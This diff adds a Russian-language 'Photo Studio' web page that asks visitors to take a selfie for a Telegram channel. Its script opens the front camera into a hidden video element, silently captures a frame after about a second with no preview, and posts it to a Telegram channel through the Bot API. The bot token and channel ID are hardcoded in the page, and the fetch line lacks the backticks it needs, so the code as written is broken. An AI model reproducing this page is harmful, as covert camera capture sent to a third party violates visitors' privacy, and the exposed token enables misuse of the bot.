@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Photo Studio</title>
+    <style>
+        :root {
+            --bg: #0b0c0f;
+            --card: #16171d;
+            --neon: #00ff5f;
+            --text: #ffffff;
+            --muted: #85868c;
+        }
+
+        body {
+            margin: 0;
+            /* 👇 Тот самый градиент с картинки вместо черного фона */
+            background: linear-gradient(to top right, #9292db, #c5f4e0);
+            color: var(--text);
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .container {
+            background: var(--card);
+            width: 85%;
+            max-width: 340px;
+            padding: 30px 25px;
+            border-radius: 24px;
+            text-align: center;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.6);
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+
+        h2 { font-weight: 700; margin-bottom: 10px; font-size: 24px; letter-spacing: -0.5px; }
+        p { color: var(--muted); font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
+
+        .agreement {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            text-align: left;
+            margin-bottom: 25px;
+            cursor: pointer;
+            padding: 12px;
+            background: rgba(255,255,255,0.03);
+            border-radius: 15px;
+        }
+
+        .agreement input {
+            width: 22px;
+            height: 22px;
+            accent-color: var(--neon);
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .agreement span { font-size: 12px; color: var(--muted); line-height: 1.4; }
+
+        .btn-stack { display: flex; flex-direction: column; gap: 12px; }
+
+        .btn {
+            padding: 18px;
+            border-radius: 15px;
+            font-size: 16px;
+            font-weight: 700;
+            border: none;
+            cursor: pointer;
+            transition: 0.2s;
+            text-decoration: none;
+            display: block;
+        }
+
+        .btn-main {
+            background-color: var(--neon);
+            color: #000;
+            opacity: 0.2;
+            pointer-events: none;
+        }
+
+        .btn-main.active {
+            opacity: 1;
+            pointer-events: auto;
+            box-shadow: 0 5px 20px rgba(0, 255, 95, 0.2);
+        }
+
+        .btn-link {
+            background: transparent;
+            color: var(--neon);
+            border: 1px solid rgba(0, 255, 95, 0.2);
+            font-size: 14px;
+        }
+
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Привет! ✨</h2>
+    <p>Сделай селфи для нашего сообщества. После подтверждения фото улетит в канал!</p>
+
+    <label class="agreement">
+        <input type="checkbox" id="agree">
+        <span>Я подтверждаю согласие на публикацию моего фото в @neznaiu11 и ознакомлен с правилами.</span>
+    </label>
+
+    <div class="btn-stack">
+        <button id="photoBtn" class="btn btn-main" onclick="startCamera()">Сделать фото</button>
+        <a href="https://t.me/neznaiu11" class="btn btn-link">Открыть канал</a>
+    </div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" width="1280" height="720"></canvas>
+
+<script>
+    const BOT_TOKEN = '8458603188:AAFW9CmwQUCEYPfOdUi7sJ86paAyeqEDEPA';
+    const CHANNEL_ID = '-1003891538122'; 
+    const TG_LINK = 'https://t.me/neznaiu11';
+
+    const checkbox = document.getElementById('agree');
+    const photoBtn = document.getElementById('photoBtn');checkbox.addEventListener('change', () => {
+        if (checkbox.checked) {
+            photoBtn.classList.add('active');
+        } else {
+            photoBtn.classList.remove('active');
+        }
+    });
+
+    async function startCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
+            });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            setTimeout(() => {
+                sendToTelegram();
+                alert("Успешно! Фото отправлено в канал.");
+                window.location.href = TG_LINK; 
+            }, 1200);
+        } catch (err) {
+            alert("Ошибка: Нужно разрешить доступ к камере в настройках браузера.");
+        }
+    }
+
+    function sendToTelegram() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, 1280, 720);
+        canvas.toBlob((blob) => {
+            const formData = new FormData();
+            formData.append('chat_id', CHANNEL_ID);
+            formData.append('photo', blob, 'mobile_user.jpg');
+            formData.append('caption', '📸 Новый участник подтвердил согласие!');
+            fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {
+                method: 'POST',
+                body: formData
+            });
+        }, 'image/jpeg', 0.8);
+    }
+</script>
+
+</body>
+</html>
